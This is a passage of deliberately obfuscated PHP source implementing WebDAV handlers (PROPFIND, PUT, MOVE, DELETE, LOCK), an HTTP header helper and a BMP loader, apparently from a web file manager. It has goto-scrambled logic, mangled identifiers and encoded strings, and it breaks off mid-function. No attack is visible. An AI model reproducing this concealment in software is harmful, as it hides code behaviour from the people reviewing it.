(!in_array($f¥šˆù°©, $f¶¦î½¤‘ï) || !is_array($fšêëÁ¦öÃ)) { continue; } $Bò§™Õ©” = array_merge($Bò§™Õ©”, $fšêëÁ¦öÃ); } foreach ($Bò§™Õ©” as &$C¢‘Âï²ÖÆ) { $C¢‘Âï²ÖÆ[$a—ª†‘á¡[28]] = str_replace($a—ª†‘á¡[8], $a—ª†‘á¡[1403], $C¢‘Âï²ÖÆ[$a—ª†‘á¡[28]]); } goto Bç¾ÃáŒéÓ; A™‹Ææ‡¨ê: $a—ª†‘á¡ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$D¹ƒ¯éÑ†Ã) { return $D¹ƒ¯éÑ†Ã; } $f¶¦î½¤‘ï = array($a—ª†‘á¡[73], $a—ª†‘á¡[74], $a—ª†‘á¡[1810]); goto e†Äêéª¿; Bç¾ÃáŒéÓ: unset($C¢‘Âï²ÖÆ); return $Bò§™Õ©”; goto aºø¥½ÄŸí; aºø¥½ÄŸí: } public function httpPROPFIND() { goto bã½°òöÙ; Fê›Å’Ñ“ê: if ($fË†Ì´Ê‡©) { $B×Ö©ÏÖİŸ = array($C¨×²ÜçÉ¨); } else { $C¨×²ÜçÉ¨[$DçŠ¬šŞõ—[28]] = $DçŠ¬šŞõ—[33]; $B×Ö©ÏÖİŸ = array_merge(array($C¨×²ÜçÉ¨), $B×Ö©ÏÖİŸ); } $cÖâã‡´½ = $DçŠ¬šŞõ—[33]; foreach ($B×Ö©ÏÖİŸ as $eºâÃ´Ÿ) { $cÖâã‡´½ .= $this->parseItemXml($eºâÃ´Ÿ, $fË†Ì´Ê‡©); } goto F—Î£¤ìâŠ; bã½°òöÙ: $DçŠ¬šŞõ— =& $_SERVER[¬ˆÚÂ”Éğä]; $c•Ø£ ãÈÀ = $this->pathList($this->path); $B×Ö©ÏÖİŸ = $this->pathListMerge($c•Ø£ ãÈÀ); goto eÉÒ˜µœ¡; F—Î£¤ìâŠ: return array($DçŠ¬šŞõ—[1813] => 207, $DçŠ¬šŞõ—[1814] => "\74\x44\72\x6d\165\154\x74\x69\163\164\141\x74\165\x73\40\x78\x6d\x6c\x6e\x73\x3a\104\75\42\x44\x41\x56\x3a\42\76\xa{$cÖâã‡´½}\12\x3c\x2f\x44\x3a\155\x75\x6c\x74\x69\x73\164\141\164\165\163\x3e"); goto aî…ÉäîŒ; eÉÒ˜µœ¡: $C¨×²ÜçÉ¨ = $c•Ø£ ãÈÀ[$DçŠ¬šŞõ—[1811]]; if (!is_array($B×Ö©ÏÖİŸ) || $C¨×²ÜçÉ¨[$DçŠ¬šŞõ—[1812]] === !1) { return array($DçŠ¬šŞõ—[1813] => 404, $DçŠ¬šŞõ—[1814] => $DçŠ¬šŞõ—[1815]); } $fË†Ì´Ê‡© = $C¨×²ÜçÉ¨[$DçŠ¬šŞõ—[29]] == $DçŠ¬šŞõ—[167] || HttpHeader::get($DçŠ¬šŞõ—[1790]) == $DçŠ¬šŞõ—[470]; goto Fê›Å’Ñ“ê; aî…ÉäîŒ: } public function httpHEAD() { $DÁºøáˆŒ´ =& $_SERVER[¬ˆÚÂ”Éğä]; $DĞ²òËù‡ = $this->pathInfo($this->path); if (!$DĞ²òËù‡ || $DĞ²òËù‡[$DÁºøáˆŒ´[29]] == $DÁºøáˆŒ´[76]) { return array($DÁºøáˆŒ´[1045] => 200, $DÁºøáˆŒ´[1220] => array($DÁºøáˆŒ´[1816])); } return array($DÁºøáˆŒ´[1045] => 200, $DÁºøáˆŒ´[1220] => array($DÁºøáˆŒ´[1817], $DÁºøáˆŒ´[136], $DÁºøáˆŒ´[1818] . $DĞ²òËù‡[$DÁºøáˆŒ´[77]], $DÁºøáˆŒ´[1819] . get_file_mime($DĞ²òËù‡[$DÁºøáˆŒ´[160]]), $DÁºøáˆŒ´[132] . gmdate($DÁºøáˆŒ´[1805], $DĞ²òËù‡[$DÁºøáˆŒ´[1267]]) . $DÁºøáˆŒ´[1820], $DÁºøáˆŒ´[1821])); } public function httpOPTIONS() { $eà¶Û±Ÿß =& $_SERVER[¬ˆÚÂ”Éğä]; return array($eà¶Û±Ÿß[1045] => 200, $eà¶Û±Ÿß[1220] => array($eà¶Û±Ÿß[1822], $eà¶Û±Ÿß[1823], $eà¶Û±Ÿß[1824], $eà¶Û±Ÿß[1276])); } public function httpPROPPATCH() { $eÛ¦¤œ†Ê =& $_SERVER[¬ˆÚÂ”Éğä]; $bŠšÔİ©Û… = $eÛ¦¤œ†Ê[1825] . $_SERVER[$eÛ¦¤œ†Ê[1401]] . $eÛ¦¤œ†Ê[1826]; return array($eÛ¦¤œ†Ê[1813] => 207, $eÛ¦¤œ†Ê[1814] => "\74\104\x3a\x6d\165\x6c\164\x69\x73\x74\x61\164\165\x73\x20\x78\155\154\156\x73\x3a\104\75\42\104\x41\126\72\42\76\12{$bŠšÔİ©Û…}\xa\74\57\104\72\x6d\165\x6c\164\x69\163\x74\141\164\x75\163\76"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $b‚…¼±Ö· =& $_SERVER[¬ˆÚÂ”Éğä]; $D“××òëâÚ = $this->uploadFile(); if ($D“××òëâÚ) { $cà‹´Äª”¯ = 204; } else { $D“××òëâÚ = $b‚…¼±Ö·[33]; $cà‹´Äª”¯ = 201; } $Aª—Ä¾¥ÉÃ = $this->pathPut($this->path, $D“××òëâÚ); if ($Aª—Ä¾¥ÉÃ == !1) { $cà‹´Äª”¯ = 404; } return array($b‚…¼±Ö·[1813] => $cà‹´Äª”¯); } private function uploadFile() { goto DëÆ£îŠƒ; b‰­ø÷‰»Á: while (!feof($c±áçÎÆ¡•)) { fwrite($Bïó“‚œ«–, fread($c±áçÎÆ¡•, 1024 * 200)); } fclose($c±áçÎÆ¡•); fclose($Bïó“‚œ«–); goto bš„Íµ™Æ¹; DëÆ£îŠƒ: $dâÒ…äÀÔ =& $_SERVER[¬ˆÚÂ”Éğä]; @mk_dir(TEMP_FILES); $aô†œÍ˜¤ = TEMP_FILES . $dâÒ…äÀÔ[1827] . rand_string(32); goto bÅ‘Éç¥ËÊ; bÅ‘Éç¥ËÊ: $Bïó“‚œ«– = @fopen($aô†œÍ˜¤, $dâÒ…äÀÔ[1535]); $c±áçÎÆ¡• = @fopen($dâÒ…äÀÔ[1828], $dâÒ…äÀÔ[1534]); if (!$c±áçÎÆ¡• || !$Bïó“‚œ«–) { @unlink($aô†œÍ˜¤); return !1; } goto b‰­ø÷‰»Á; bš„Íµ™Æ¹: if (@filesize($aô†œÍ˜¤) > 0) { return $aô†œÍ˜¤; } @unlink($aô†œÍ˜¤); return !1; goto eŞ„‰’¾Óó; eŞ„‰’¾Óó: } public function httpMKCOL() { $BÂÁ¡Ø™Ï„ =& $_SERVER[¬ˆÚÂ”Éğä]; if ($this->pathExists($this->path)) { return array($BÂÁ¡Ø™Ï„[1045] => 409); } $fº¡Ç®Òê = $this->pathMkdir($this->path); return array($BÂÁ¡Ø™Ï„[1045] => $fº¡Ç®Òê ? 201 : 403); } public function httpMOVE() { $e”ĞÇ”ã© =& $_SERVER[¬ˆÚÂ”Éğä]; $E°µ‡ÔÖ‘ = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$e”ĞÇ”ã©[1829]])) { $Cˆ……ˆãÍÚ[$e”ĞÇ”ã©[1830]] = $_SERVER[$e”ĞÇ”ã©[1829]] == $e”ĞÇ”ã©[1831]; } $aéëêÊ½Æ­ = $this->pathMove($this->path, $E°µ‡ÔÖ‘); return array($e”ĞÇ”ã©[1045] => $aéëêÊ½Æ­ ? 201 : 404); } public function httpCOPY() { $B°„‹é‘™ = $this->parsePath($this->pathGet(!0)); $bÅ­Ñ¾œ = $this->pathCopy($this->path, $B°„‹é‘™); return array($_SERVER[¬ˆÚÂ”Éğä][1045] => $bÅ­Ñ¾œ ? 201 : 404); } public function httpDELETE() { $dàø‹“”¬ = $this->pathRemove($this->path); return array($_SERVER[¬ˆÚÂ”Éğä][1045] => $dàø‹“”¬ ? 200 : 503); } public function httpLOCK() { $dò‚›öºÌÍ =& $_SERVER[¬ˆÚÂ”Éğä]; $Aù÷Ş‘ğˆ = md5($this->path); $Fè¢—”ÉØæ = $dò‚›öºÌÍ[1832] . $this->xmlGet($dò‚›öºÌÍ[1833]) . $dò‚›öºÌÍ[1834] . $Aù÷Ş‘ğˆ . $dò‚›öºÌÍ[1835]; return array($dò‚›öºÌÍ[1045] => 200, $dò‚›öºÌÍ[1220] => array($dò‚›öºÌÍ[1836] . $Aù÷Ş‘ğˆ, $dò‚›öºÌÍ[1837]), $dò‚›öºÌÍ[1838] => $Fè¢—”ÉØæ); } public function httpUNLOCK() { return array($_SERVER[¬ˆÚÂ”Éğä][1045] => 204); } public function xmlGet($Cš¤Èø˜¾) { goto Bâ¹«ÌˆÚ¯; B…ãš¶Ó : $dŠ“ğÑ¢â„ = explode($aÜ·­íì¡Ø[8], $Cš¤Èø˜¾); $f‚µì³Ó¨ = array_shift($dŠ“ğÑ¢â„); $Bä«¯Š•ñ¼ = $A£Ãõ•”¨§->getElementsByTagNameNS($aÜ·­íì¡Ø[1840], $f‚µì³Ó¨); goto aÒÖƒó Â”; aÒÖƒó Â”: if ($Bä«¯Š•ñ¼) { return $Bä«¯Š•ñ¼[0]->nodeValue; } return $aÜ·­íì¡Ø[33]; goto DµÒ¸ÎÖ÷Ğ; Bâ¹«ÌˆÚ¯: $aÜ·­íì¡Ø =& $_SERVER[¬ˆÚÂ”Éğä]; static $A£Ãõ•”¨§ = false; if (!$A£Ãõ•”¨§) { $C™‹–±ÛÉà = file_get_contents($aÜ·­íì¡Ø[1839]); $A£Ãõ•”¨§ = new DOMDocument(); $A£Ãõ•”¨§->loadXML($C™‹–±ÛÉà); } goto B…ãš¶Ó ; DµÒ¸ÎÖ÷Ğ: } public static function response($fáÏ°£îğ) { goto cÖèÜÕïÄ; cÖèÜÕïÄ: $a¨Ï˜¹‹Å… =& $_SERVER[¬ˆÚÂ”Éğä]; $fâ† ›Ñá† = is_array($fáÏ°£îğ[$a¨Ï˜¹‹Å…[1220]]) ? $fáÏ°£îğ[$a¨Ï˜¹‹Å…[1220]] : array(); $fâ† ›Ñá†[] = HttpHeader::code($fáÏ°£îğ[$a¨Ï˜¹‹Å…[1045]]); goto CíªŒã¢§ª; CíªŒã¢§ª: $fâ† ›Ñá†[] = $a¨Ï˜¹‹Å…[1780]; $fâ† ›Ñá†[] = $a¨Ï˜¹‹Å…[1781]; foreach ($fâ† ›Ñá† as $cÔ¦Èê¥Ş©) { header($cÔ¦Èê¥Ş©); } goto C¤Šºà­¹; C¤Šºà­¹: if (is_string($fáÏ°£îğ[$a¨Ï˜¹‹Å…[1838]])) { header($a¨Ï˜¹‹Å…[1841]); $c™„®ÃÏ•ô = $a¨Ï˜¹‹Å…[1842] . $a¨Ï˜¹‹Å…[217] . $fáÏ°£îğ[$a¨Ï˜¹‹Å…[1838]]; echo $c™„®ÃÏ•ô; } goto D›ëõ¸ø°À; D›ëõ¸ø°À: } } class HttpHeader { public static $_headers = array("\110\157\163\164" => "\110\124\124\x50\137\x48\117\123\x54", "\125\x73\x65\162\55\101\x67\x65\x6e\x74" => "\x48\124\124\120\x5f\125\123\x45\122\137\x41\107\105\x4e\x54", "\x43\157\x6e\164\x65\156\164\55\124\x79\x70\145" => "\x48\x54\x54\120\137\103\x4f\x4e\124\x45\x4e\x54\137\x54\131\120\x45", "\x43\157\156\164\145\x6e\x74\x2d\x4c\145\156\147\x74\x68" => "\110\124\x54\120\x5f\x43\117\116\x54\x45\x4e\x54\137\114\105\116\107\124\x48", "\104\145\160\x74\x68" => "\110\124\x54\120\x5f\x44\105\x50\x54\110", "\105\x78\x70\145\143\164" => "\x48\124\x54\120\x5f\x45\x58\x50\105\x43\124", "\111\x66\55\116\157\x6e\x65\55\115\x61\x74\x63\150" => "\110\124\x54\x50\137\x49\x46\x5f\116\x4f\116\105\x5f\115\x41\124\x43\x48", "\x49\x66\55\115\141\x74\143\150" => "\110\x54\124\x50\x5f\x49\106\x5f\115\x41\124\103\110", "\111\x66\55\122\x61\156\147\145" => "\x48\x54\124\120\x5f\111\x46\137\122\x41\x4e\x47\105", "\x4c\x61\163\x74\55\x4d\x6f\144\x69\146\151\x65\144" => "\x48\x54\x54\x50\137\114\x41\123\x54\x5f\x4d\x4f\104\111\106\111\105\x44", "\x49\x66\x2d\115\157\x64\151\x66\151\x65\x64\55\x53\151\x6e\143\x65" => "\110\124\124\x50\x5f\111\x46\137\x4d\x4f\x44\x49\x46\111\105\x44\x5f\123\x49\x4e\103\105", "\111\x66\55\125\156\155\x6f\144\151\x66\151\145\144\x2d\123\x69\x6e\x63\145" => "\110\124\x54\x50\137\111\x46\x5f\125\116\x4d\117\104\111\106\111\x45\x44\137\123\x49\116\103\105", "\x52\x61\156\147\145" => "\110\124\x54\x50\x5f\122\x41\116\107\x45", "\124\151\x6d\x65\x6f\x75\x74" => "\x48\x54\124\x50\137\x54\111\115\x45\117\125\x54", "\x49\x66" => "\110\x54\124\x50\137\111\x46", "\114\157\143\x6b\x2d\124\157\153\x65\156" => "\x48\124\x54\x50\x5f\x4c\117\x43\113\137\124\x4f\113\105\116", "\117\x76\145\162\167\162\x69\x74\145" => "\110\x54\x54\x50\137\x4f\126\105\x52\127\122\x49\x54\x45", "\104\x65\x73\x74\x69\156\141\x74\151\157\156" => "\x48\124\x54\120\137\x44\x45\123\x54\111\116\101\124\111\x4f\116", "\x52\x65\x71\x75\145\163\164\x2d\x49\144" => "\x52\105\121\x55\x45\x53\124\x5f\x49\x44", "\122\x65\161\x75\145\x73\x74\55\x42\x6f\144\171\55\x46\151\x6c\145" => "\122\x45\121\x55\x45\x53\x54\x5f\102\117\104\131\x5f\106\111\114\105", "\x52\x65\x64\x69\x72\145\143\x74\x2d\123\x74\141\164\165\x73" => "\x52\105\x44\111\122\105\103\x54\x5f\x53\x54\101\x54\x55\x53"); public static function init() { static $DàÁÌ†™ = false; if ($DàÁÌ†™) { return; } foreach ($_SERVER as $E¹¾êš½ø => $b¹¦„«®Ù©) { $E¹¾êš½ø = strtoupper($E¹¾êš½ø); if (!array_key_exists($E¹¾êš½ø, $_SERVER)) { continue; } $_SERVER[$E¹¾êš½ø] = $b¹¦„«®Ù©; } foreach (self::$_headers as $E¹¾êš½ø => $dÆÅ´¾¬à¿) { if (!array_key_exists($E¹¾êš½ø, $_SERVER)) { continue; } $_SERVER[$E¹¾êš½ø] = $_SERVER[$dÆÅ´¾¬à¿]; $_SERVER[strtoupper($E¹¾êš½ø)] = $_SERVER[$dÆÅ´¾¬à¿]; } } public static function get($c…ëĞ‚êğ) { self::init(); return $_SERVER[$c…ëĞ‚êğ] ? $_SERVER[$c…ëĞ‚êğ] : $_SERVER[$_SERVER[¬ˆÚÂ”Éğä][1843] . strtoupper($c…ëĞ‚êğ)]; } public static function method() { return strtoupper(self::get($_SERVER[¬ˆÚÂ”Éğä][154])); } public static function length() { $f·ÈÊ³Ì‚´ =& $_SERVER[¬ˆÚÂ”Éğä]; $d¾àÉ¦ÆÎÈ = self::get($f·ÈÊ³Ì‚´[1844]); if (!$d¾àÉ¦ÆÎÈ) { $d¾àÉ¦ÆÎÈ = self::get($f·ÈÊ³Ì‚´[1159]); } return $d¾àÉ¦ÆÎÈ; } public static function range() { $D´Ê›ŒŠŠš =& $_SERVER[¬ˆÚÂ”Éğä]; $d°ÕßĞ™º = self::get($D´Ê›ŒŠŠš[198]); if (!$d°ÕßĞ™º) { return !1; } if (!preg_match($D´Ê›ŒŠŠš[1845], $d°ÕßĞ™º, $AÁ’öïÉÎª)) { return !1; } if ($AÁ’öïÉÎª[1] === $D´Ê›ŒŠŠš[33] && $AÁ’öïÉÎª[2] === $D´Ê›ŒŠŠš[33]) { return !1; } return array($AÁ’öïÉÎª[1] !== $D´Ê›ŒŠŠš[33] ? $AÁ’öïÉÎª[1] : null, $AÁ’öïÉÎª[2] !== $D´Ê›ŒŠŠš[33] ? $AÁ’öïÉÎª[2] : null); } public static $statusCode = array("\61\x30\x30" => "\103\x6f\x6e\164\151\156\x75\145", "\x31\60\61" => "\123\x77\x69\164\x63\150\x69\156\147\x20\x50\x72\157\x74\157\x63\157\154", "\x31\x30\x32" => "\120\x72\x6f\143\145\163\x73\151\x6e\x67", "\x31\x30\x33" => "\105\141\162\x6c\171\x20\x48\151\x6e\164\x73", "\62\60\60" => "\x4f\113", "\62\60\x31" => "\103\162\145\x61\x74\145\x64", "\x32\60\62" => "\x41\143\143\145\160\164\x65\x64", "\x32\60\x33" => "\116\x6f\x6e\x2d\x41\165\x74\x68\157\162\x69\x74\x61\164\x69\166\145\40\x49\156\x66\157\162\155\141\164\x69\157\156", "\62\60\64" => "\x4e\x6f\x20\103\x6f\156\164\145\x6e\x74", "\62\x30\65" => "\x52\x65\163\145\164\x20\x43\x6f\156\x74\145\156\x74", "\62\60\66" => "\x50\x61\162\164\151\141\x6c\x20\x43\x6f\x6e\164\145\156\164", "\x32\60\x37" => "\115\165\154\x74\x69\55\123\164\x61\164\165\x73", "\63\60\x30" => "\x4d\x75\154\164\151\x70\x6c\x65\x20\x43\x68\x6f\x69\143\x65\x73", "\63\60\61" => "\115\157\166\145\x64\40\120\x65\x72\x6d\x61\156\145\156\164\154\171", "\63\x30\x32" => "\x46\157\x75\x6e\144", "\x33\60\x33" => "\123\x65\x65\x20\x4f\164\150\145\162", "\x33\x30\x34" => "\x4e\157\x74\40\x4d\157\144\x69\x66\x69\x65\144", "\x33\x30\x35" => "\x55\163\145\40\x50\162\x6f\x78\171", "\x33\60\67" => "\124\145\x6d\160\157\x72\x61\162\171\40\x52\145\x64\x69\162\145\143\164", "\63\60\x38" => "\120\x65\x72\155\141\x6e\145\x6e\164\x20\x52\145\144\151\162\x65\x63\x74", "\64\x30\60" => "\102\x61\144\40\x52\x65\161\x75\x65\x73\164", "\x34\x30\x31" => "\125\156\141\x75\164\150\x6f\x72\x69\172\x65\x64", "\64\x30\x32" => "\x50\x61\x79\x6d\145\156\164\40\122\x65\161\165\x69\162\x65\144", "\64\60\x33" => "\106\x6f\x72\x62\x69\x64\144\x65\156", "\64\x30\x34" => "\116\x6f\x74\x20\x46\157\x75\156\144", "\x34\x30\x35" => "\x4d\x65\x74\x68\157\x64\x20\x4e\x6f\164\x20\101\154\x6c\157\x77\145\144", "\64\x30\66" => "\x4e\x6f\x74\40\101\x63\143\x65\x70\x74\141\142\154\x65", "\x34\x30\67" => "\x50\x72\157\170\171\40\x41\165\x74\150\x65\x6e\x74\x69\x63\141\x74\151\157\x6e\x20\x52\145\161\x75\151\x72\x65\x64", "\x34\60\x38" => "\x52\145\161\165\x65\163\164\40\x54\x69\x6d\x65\157\x75\x74", "\64\60\x39" => "\103\x6f\156\x66\x6c\x69\143\164", "\x34\x31\60" => "\107\x6f\x6e\x65", "\x34\61\61" => "\x4c\145\x6e\x67\164\150\40\122\145\x71\165\x69\162\145\x64", "\x34\x31\62" => "\120\162\x65\x63\x6f\156\144\151\x74\x69\157\156\40\106\x61\151\x6c\x65\144", "\x34\61\x33" => "\122\145\161\x75\145\x73\164\x20\105\156\x74\x69\x74\x79\40\124\x6f\x6f\40\x4c\x61\162\x67\145", "\x34\61\64" => "\122\x65\x71\x75\x65\163\x74\x20\x55\122\111\40\x54\x6f\x6f\40\x4c\x61\162\x67\145", "\64\x31\x35" => "\x55\x6e\163\x75\160\160\x6f\162\x74\145\x64\x20\x4d\145\x64\151\141\40\x54\x79\160\x65", "\64\x31\66" => "\x52\145\161\165\x65\x73\164\145\144\x20\x52\x61\156\x67\x65\40\116\157\164\40\123\141\x74\x69\163\146\151\141\142\x6c\145", "\x34\x31\x37" => "\105\x78\160\145\x63\x74\x61\x74\151\157\x6e\x20\x46\x61\151\154\145\x64", "\x34\x32\62" => "\x55\156\x70\162\x6f\x63\145\163\163\x61\x62\x6c\145\x20\x45\156\x74\x69\164\x79", "\64\x32\63" => "\114\157\x63\x6b\145\x64", "\x34\x32\64" => "\x46\x61\151\154\x65\144\40\x44\x65\x70\145\x6e\144\145\x6e\143\x79", "\64\x32\x35" => "\x55\156\x6f\x72\x64\145\162\145\144\40\103\157\154\154\x65\x63\x74\x69\157\x6e", "\64\62\x36" => "\125\x70\147\162\141\144\145\40\122\x65\x71\165\151\162\x65\144", "\64\62\x38" => "\x50\162\x65\x63\157\156\144\151\164\x69\157\x6e\x20\x52\x65\161\x75\x69\162\x65\x64", "\x34\x32\x39" => "\124\x6f\x6f\40\115\141\x6e\171\x20\122\x65\161\165\145\x73\164\x73", "\x34\63\x31" => "\x52\x65\161\x75\x65\163\164\40\110\x65\141\144\145\x72\40\106\151\x65\154\x64\x73\x20\124\x6f\157\x20\114\x61\162\x67\145", "\64\x34\x34" => "\x4e\x6f\40\x52\x65\x73\x70\x6f\x6e\x73\x65", "\x34\65\60" => "\102\154\157\143\153\x65\x64\40\142\x79\40\127\x69\156\144\157\167\163\x20\x50\x61\x72\x65\156\x74\x61\154\x20\103\157\156\x74\x72\157\x6c\x73", "\x34\65\61" => "\x55\156\x61\x76\141\x69\154\x61\142\154\x65\40\x46\x6f\162\40\x4c\x65\147\141\x6c\x20\x52\x65\x61\x73\157\156\x73", "\x34\x39\x34" => "\x52\145\x71\165\145\163\164\x20\x48\x65\141\x64\145\162\x20\124\157\x6f\40\114\141\x72\147\x65", "\65\x30\x30" => "\x49\x6e\x74\145\x72\x6e\x61\154\40\x53\145\162\x76\145\x72\40\x45\x72\x72\157\x72", "\65\x30\61" => "\x4e\x6f\x74\40\x49\x6d\x70\x6c\145\155\145\x6e\x74\145\x64", "\65\60\62" => "\x42\x61\x64\40\107\x61\164\145\167\x61\x79", "\65\x30\63" => "\x53\x65\162\x76\151\x63\x65\x20\125\156\141\x76\x61\151\154\141\x62\x6c\x65", "\x35\x30\x34" => "\x47\x61\164\x65\167\x61\x79\40\124\151\155\145\x6f\165\x74", "\x35\60\x35" => "\x48\x54\x54\120\40\126\x65\x72\163\151\x6f\x6e\40\156\157\x74\x20\163\x75\160\x70\157\x72\164\x65\x64", "\x35\x30\67" => "\111\x6e\x73\165\146\146\x69\x63\x69\145\156\x74\40\x53\164\157\162\141\147\x65"); public static function code($fÂÎ†«—çƒ) { $f‹Šá¢ÀÂò =& $_SERVER[¬ˆÚÂ”Éğä]; $fÂÎ†«—çƒ = $fÂÎ†«—çƒ . $f‹Šá¢ÀÂò[33]; $EÁœô³‘‰® = self::$statusCode[$fÂÎ†«—çƒ]; $EÁœô³‘‰® = $EÁœô³‘‰® ? "\x48\x54\x54\x50\57\x31\x2e\61\40{$fÂÎ†«—çƒ}\x20" . $EÁœô³‘‰® : $f‹Šá¢ÀÂò[33]; return $EÁœô³‘‰®; } } class ImageGdBMP { public static function load($F¦•¸è Ş) { $fÈÓŒù‘‘­ = fopen($F¦•¸è Ş, $_SERVER[¬ˆÚÂ”Éğä][1534]); if ($fÈÓŒù‘‘­ === !1) { return !1; } $C¶™ì¹ß§ = self::loadFromStream($fÈÓŒù‘‘­); fclose($fÈÓŒù‘‘­); return $C¶™ì¹ß§; } public static function loadFromStream($BåŞ‚ â…÷) { $aµÖ•‹Íáİ =& $_SERVER[¬ˆÚÂ”Éğä]; $EºµÖßÚâã = fread($BåŞ‚ â…÷, 14); if ($EºµÖßÚâã === !1) { return !1; } if ($EºµÖßÚâã[0] != $aµÖ•‹Íáİ[1846] || $EºµÖßÚâã[1] != $aµÖ•‹Íáİ[1847]) { return !1; } $A¿¢œäŒ¹í = unpack($aµÖ•‹Íáİ[1848] . $aµÖ•‹Íáİ[1849] . $aµÖ•‹Íáİ[1850] . $aµÖ•‹Íáİ[1851] . $aµÖ•‹Íáİ[1852], $EºµÖßÚâã); return self::loadFromStreamAndFileHeader($BåŞ‚ â…÷, $A¿¢œäŒ¹í); } public static function loadFromStreamAndFileHeader($D¬Üº®Â’§, array $d‰‡¡À›àİ) { goto c¼ä˜ŸêÌ; c¼ä˜ŸêÌ: $båé“¡Æš =& $_SERVER[¬ˆÚÂ”Éğä]; if ($d‰‡¡À›àİ[$båé“¡Æš[388]] != 19778) { return !1; } $aÜÚó´”•ê = fread($D¬Üº®Â’§, 4); goto fßˆ¶Í«Û£; cÌ ô¢ğÕë: if ($AŒ—šŞÔšÔ == 1 || $AŒ—šŞÔšÔ == 4 || $AŒ—šŞÔšÔ == 8) { goto f ˆåè»’; Fğ£Ïƒ«÷: $CÒ¾æ‘Ëî• = (1 << $AŒ—šŞÔšÔ) - 1 << $DÄ¶®Ô¹Œ; if ($AÄÁŒ¥—½í == 1 || $AÄÁŒ¥—½í == 2) { $ašÅ¢ÂŞ—¢ = 0; $FÍ­˜á ˜É = $AŒ—šŞÔšÔ >> 2 & 1; for (;;) { if ($ašÅ¢ÂŞ—¢ < -1 || $ašÅ¢ÂŞ—¢ > $AÔ’ÂÔïÀ || $AÖ¨šÄÈİ < -1 || $AÖ¨šÄÈİ > $D™÷•½â½ß) { imagedestroy($C‚—Ìœñ¨»); return !1; } $aÜÚó´”•ê = fread($D¬Üº®Â’§, 1); if ($aÜÚó´”•ê === !1) { imagedestroy($C‚—Ìœñ¨»); return !1; } switch ($aÜÚó´”•ê) { case $båé“¡Æš[1871]: $aÜÚó´”•ê = fread($D¬Üº®Â’§, 1); if ($aÜÚó´”•ê === !1) { imagedestroy($C‚—Ìœñ¨»); return !1; } switch ($aÜÚó´”•ê) { case $båé“¡Æš[1871]: $AÖ¨šÄÈİ += $aÖ…Ê±—¾ê; $ašÅ¢ÂŞ—¢ = 0; break; case $båé“¡Æš[1873]: $AÖ¨šÄÈİ = 0; $ašÅ¢ÂŞ—¢ = 0; break 3; case $båé“¡Æš[1874]: $aÜÚó´”•ê = fread($D¬Üº®Â’§, 2); if ($aÜÚó´”•ê === !1) { imagedestroy($C‚—Ìœñ¨»); return !1; } list(, $DÑ§ŒŠÃ‚å, $e¼´¸ÜÍ“) = unpack($båé“¡Æš[1875], $aÜÚó´”•ê); $ašÅ¢ÂŞ—¢ += $DÑ§ŒŠÃ‚å; $AÖ¨šÄÈİ += $e¼´¸ÜÍ“ * $aÖ…Ê±—¾ê; break; default: list(, $Eô²³ùŠö‡) = unpack($båé“¡Æš[1876], $aÜÚó´”•ê); $cËØ¬©ô° = ($Eô²³ùŠö‡ >> $FÍ­˜á ˜É) + ($Eô²³ùŠö‡ & $FÍ­˜á ˜É); $aÜÚó´”•ê = fread($D¬Üº®Â’§, $cËØ¬©ô° + 1 & ~1); if ($aÜÚó´”•ê === !1) { imagedestroy($C‚—Ìœñ¨»); return !1; } for ($AßÅÎˆÛé” = 0, $F—‚ì…‰ˆÛ = 0; $AßÅÎˆÛé” < $Eô²³ùŠö‡; ++$AßÅÎˆÛé”, ++$ašÅ¢ÂŞ—¢, $F—‚ì…‰ˆÛ += $AŒ—šŞÔšÔ) { list(, $bó´Âñè¼») = unpack($båé“¡Æš[1876], $aÜÚó´”•ê[$F—‚ì…‰ˆÛ >> 3]); $Bˆ¨”ó­Ì† = $F—‚ì…‰ˆÛ & 7; imagesetpixel($C‚—Ìœñ¨», $ašÅ¢ÂŞ—¢, $AÖ¨šÄÈİ, $eš‹·šÆĞÊ[($bó´Âñè¼» & $CÒ¾æ‘Ëî• >> $Bˆ¨”ó­Ì†) >> $DÄ¶®Ô¹Œ - $Bˆ¨”ó­Ì†]); } break; } break; default: $Cë–Ÿï‘Ô™ = fread($D¬Üº®Â’§, 1); if ($Cë–Ÿï‘Ô™ === !1) { imagedestroy($C‚—Ìœñ¨»); return !1; } list(, $B¦Ø°¾ÁéÖ, $bó´Âñè¼») = unpack($båé“¡Æš[1875], $aÜÚó´”•ê . $Cë–Ÿï‘Ô™); for ($AßÅÎˆÛé” = 0, $F—‚ì…‰ˆÛ = 0; $AßÅÎˆÛé” < $B¦Ø°¾ÁéÖ; ++$AßÅÎˆÛé”, ++$ašÅ¢ÂŞ—¢, $F—‚ì…‰ˆÛ += $AŒ—šŞÔšÔ) { $Bˆ¨”ó­Ì† = $F—‚ì…‰ˆÛ & 7; imagesetpixel($C‚—Ìœñ¨», $ašÅ¢ÂŞ—¢, $AÖ¨šÄÈİ, $eš‹·šÆĞÊ[($bó´Âñè¼» & $CÒ¾æ‘Ëî• >> $Bˆ¨”ó­Ì†) >> $DÄ¶®Ô¹Œ - $Bˆ¨”ó­Ì†]); } break; } } } else { for ($böÕ½æìÜø = 0; $böÕ½æìÜø < $eÓÎ­›¸å; ++$böÕ½æìÜø, $AÖ¨šÄÈİ += $aÖ…Ê±—¾ê) { $aÜÚó´”•ê = fread($D¬Üº®Â’§, $D–ä„çµ¾Í); if ($aÜÚó´”•ê === !1) { imagedestroy($C‚—Ìœñ¨»); return !1; } $F—‚ì…‰ˆÛ = 0; for ($ašÅ¢ÂŞ—¢ = 0; $ašÅ¢ÂŞ—¢ < $AÔ’ÂÔïÀ; ++$ašÅ¢ÂŞ—¢, $F—‚ì…‰ˆÛ += $AŒ—šŞÔšÔ) { list(, $bó´Âñè¼») = unpack($båé“¡Æš[1876], $aÜÚó´”•ê[$F—‚ì…‰ˆÛ >> 3]); $Bˆ¨”ó­Ì† = $F—‚ì…‰ˆÛ & 7; imagesetpixel($C‚—Ìœñ¨», $ašÅ¢ÂŞ—¢, $AÖ¨šÄÈİ, $eš‹·šÆĞÊ[($bó´Âñè¼» & $CÒ¾æ‘Ëî• >> $Bˆ¨”ó­Ì†) >> $DÄ¶®Ô¹Œ - $Bˆ¨”ó­Ì†]); } } } goto Bƒï–Ÿ’¼ó; f ˆåè»’: $C‚—Ìœñ¨» = imagecreate($AÔ’ÂÔïÀ, $eÓÎ­›¸å); $AŒ¸éğ•†” = $eÍìà”¿·í == 12 ? 3 : 4; 